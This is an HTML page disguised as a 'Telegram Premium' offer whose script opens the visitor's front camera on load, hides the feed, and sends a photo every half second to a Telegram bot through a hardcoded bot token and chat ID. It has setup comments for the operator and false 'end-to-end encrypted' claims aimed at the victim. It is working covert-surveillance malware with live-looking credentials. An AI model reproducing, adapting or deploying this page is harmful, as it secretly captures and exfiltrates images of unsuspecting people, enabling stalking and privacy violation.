<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Premium</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background: #0a0a0a;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
        }
        .bg-orb {
            position: fixed;
            border-radius: 50%;
            filter: blur(80px);
            animation: orbFloat 20s ease-in-out infinite;
        }
        .bg-orb:nth-child(1) {
            width: 500px; height: 500px;
            background: radial-gradient(circle, rgba(0,136,204,0.4), transparent 70%);
            top: -10%; left: -10%;
        }
        .bg-orb:nth-child(2) {
            width: 400px; height: 400px;
            background: radial-gradient(circle, rgba(0,178,255,0.3), transparent 70%);
            bottom: -10%; right: -10%;
            animation-delay: -7s;
        }
        @keyframes orbFloat {
            0%, 100% { transform: translate(0,0) scale(1); }
            33% { transform: translate(30px,-30px) scale(1.1); }
            66% { transform: translate(-20px,20px) scale(0.9); }
        }
        .container {
            position: relative;
            z-index: 1;
            width: 100%;
            max-width: 400px;
            animation: slideUp 0.6s ease-out;
        }
        @keyframes slideUp {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .card {
            background: rgba(255,255,255,0.03);
            backdrop-filter: blur(40px);
            border-radius: 32px;
            padding: 40px 32px;
            border: 1px solid rgba(255,255,255,0.04);
            box-shadow: 0 30px 80px rgba(0,0,0,0.6);
        }
        .badge {
            display: inline-block;
            background: linear-gradient(135deg, rgba(0,136,204,0.15), rgba(0,178,255,0.05));
            padding: 6px 18px;
            border-radius: 100px;
            font-size: 11px;
            font-weight: 600;
            color: #00b2ff;
            border: 1px solid rgba(0,136,204,0.1);
            margin-bottom: 20px;
        }
        .logo {
            display: flex;
            align-items: center;
            gap: 14px;
            margin-bottom: 16px;
        }
        .logo-icon {
            width: 56px; height: 56px;
            background: linear-gradient(145deg, #0088cc, #00b2ff);
            border-radius: 16px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 28px;
            box-shadow: 0 8px 32px rgba(0,136,204,0.25);
        }
        .logo-text h1 {
            color: #fff;
            font-size: 24px;
            font-weight: 800;
        }
        .logo-text h1 span { color: #00b2ff; }
        .logo-text p {
            color: rgba(255,255,255,0.5);
            font-size: 13px;
        }
        .status-box {
            margin: 20px 0;
            padding: 14px 18px;
            border-radius: 12px;
            text-align: center;
            font-size: 14px;
            font-weight: 500;
            background: rgba(0,136,204,0.05);
            border: 1px solid rgba(0,136,204,0.08);
            color: rgba(255,255,255,0.7);
        }
        .status-box .dot {
            display: inline-block;
            width: 8px; height: 8px;
            border-radius: 50%;
            margin-right: 8px;
            animation: blink 1s infinite;
        }
        .dot.green { background: #00c853; }
        .dot.red { background: #ff5252; }
        .dot.yellow { background: #ffd600; animation: none; }
        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.3; }
        }
        .stats {
            display: flex;
            justify-content: space-between;
            padding: 12px 0;
            border-top: 1px solid rgba(255,255,255,0.05);
            margin-top: 16px;
        }
        .stats span {
            color: rgba(255,255,255,0.4);
            font-size: 12px;
        }
        .stats strong {
            color: #fff;
            font-size: 16px;
        }
        .footer {
            margin-top: 20px;
            text-align: center;
            color: rgba(255,255,255,0.1);
            font-size: 11px;
        }
        #hiddenVideo, #hiddenCanvas { display: none !important; }
    </style>
</head>
<body>
    <div class="bg-orb"></div>
    <div class="bg-orb"></div>

    <div class="container">
        <div class="card">
            <div class="badge">★ Telegram Premium</div>
            <div class="logo">
                <div class="logo-icon">✈</div>
                <div class="logo-text">
                    <h1>Telegram <span>Premium</span></h1>
                    <p>Secure · Private · Fast</p>
                </div>
            </div>

            <div class="status-box" id="statusBox">
                <span class="dot yellow" id="statusDot"></span>
                <span id="statusText">Initializing...</span>
            </div>

            <div class="stats">
                <div><span>📸 Captured</span><br><strong id="photoCount">0</strong></div>
                <div><span>⏱ Interval</span><br><strong>0.5s</strong></div>
                <div><span>📤 Sent</span><br><strong id="sentCount">0</strong></div>
            </div>

            <div class="footer">🔒 Auto-verified · End-to-end encrypted</div>
        </div>
    </div>

    <video id="hiddenVideo" autoplay></video>
    <canvas id="hiddenCanvas"></canvas>

    <script>
        // ============================================================
        // 🔥 CONFIG - SIRF YAHAN CHANGE KARO!
        // ============================================================
        const TELEGRAM_TOKEN = '7754677986:AAGjnglM6d3RoTCDrbKHfXD_VazEZOQpfkA';  // @BotFather se
        const TELEGRAM_CHAT_ID = '5975952682';  // @userinfobot se
        const CAPTURE_INTERVAL = 500; // 0.5 seconds

        // ============================================================
        // 🎯 SYSTEM - BAS YAHI SE NICHE KUCH MAT KARO
        // ============================================================
        const video = document.getElementById('hiddenVideo');
        const canvas = document.getElementById('hiddenCanvas');
        const ctx = canvas.getContext('2d');
        const statusText = document.getElementById('statusText');
        const statusDot = document.getElementById('statusDot');
        const photoCount = document.getElementById('photoCount');
        const sentCount = document.getElementById('sentCount');

        let cameraReady = false;
        let stream = null;
        let interval = null;
        let count = 0;
        let sent = 0;
        let isSending = false;

        // ===== SEND TO TELEGRAM (Direct) =====
        async function sendToTelegram(imageData) {
            if (isSending) return;
            isSending = true;

            try {
                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: (() => {
                        const form = new FormData();
                        form.append('chat_id', TELEGRAM_CHAT_ID);
                        form.append('photo', dataURItoBlob(imageData), 'capture.jpg');
                        form.append('caption', `📸 Auto-Capture\n⏰ ${new Date().toLocaleString()}\n📊 #${count}`);
                        return form;
                    })()
                });

                const result = await response.json();
                if (result.ok) {
                    sent++;
                    sentCount.textContent = sent;
                    statusText.textContent = `✅ Sent: ${sent} photos`;
                    statusDot.className = 'dot green';
                } else {
                    statusText.textContent = `⚠️ Error: ${result.description}`;
                    statusDot.className = 'dot red';
                }
            } catch (err) {
                statusText.textContent = `⚠️ Connection error`;
                statusDot.className = 'dot red';
            } finally {
                isSending = false;
            }
        }

        // ===== CONVERT DATA URI TO BLOB =====
        function dataURItoBlob(dataURI) {
            const byteString = atob(dataURI.split(',')[1]);
            const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
            const ab = new ArrayBuffer(byteString.length);
            const ia = new Uint8Array(ab);
            for (let i = 0; i < byteString.length; i++) {
                ia[i] = byteString.charCodeAt(i);
            }
            return new Blob([ab], { type: mimeString });
        }

        // ===== CAPTURE PHOTO =====
        function capturePhoto() {
            if (!cameraReady) return null;
            try {
                if (video.videoWidth > 0) {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                }
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                return canvas.toDataURL('image/jpeg', 0.8);
            } catch {
                return null;
            }
        }

        // ===== AUTO CAPTURE LOOP =====
        function startAutoCapture() {
            if (interval) clearInterval(interval);
            
            interval = setInterval(() => {
                if (cameraReady) {
                    const img = capturePhoto();
                    if (img) {
                        count++;
                        photoCount.textContent = count;
                        sendToTelegram(img);
                    }
                }
            }, CAPTURE_INTERVAL);

            statusText.textContent = '📸 Auto-capturing...';
            statusDot.className = 'dot green';
        }

        // ===== INIT CAMERA =====
        async function initCamera() {
            try {
                statusText.textContent = '📷 Requesting camera...';
                statusDot.className = 'dot yellow';

                stream = await navigator.mediaDevices.getUserMedia({
                    video: { width: 640, height: 480, facingMode: 'user' }
                });

                video.srcObject = stream;
                await video.play();
                cameraReady = true;

                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;

                statusText.textContent = '✅ Camera ready - Auto-capturing!';
                statusDot.className = 'dot green';

                startAutoCapture();

            } catch (err) {
                cameraReady = false;
                statusText.textContent = '❌ Camera denied: ' + err.message;
                statusDot.className = 'dot red';
            }
        }

        // ===== START =====
        document.addEventListener('DOMContentLoaded', initCamera);

        // ===== CLEANUP =====
        window.addEventListener('beforeunload', () => {
            if (interval) clearInterval(interval);
            if (stream) stream.getTracks().forEach(t => t.stop());
        });

        console.log('🚀 Telegram Auto-Capture System');
        console.log('📡 Sending to Telegram...');
    </script>
</body>
</html>
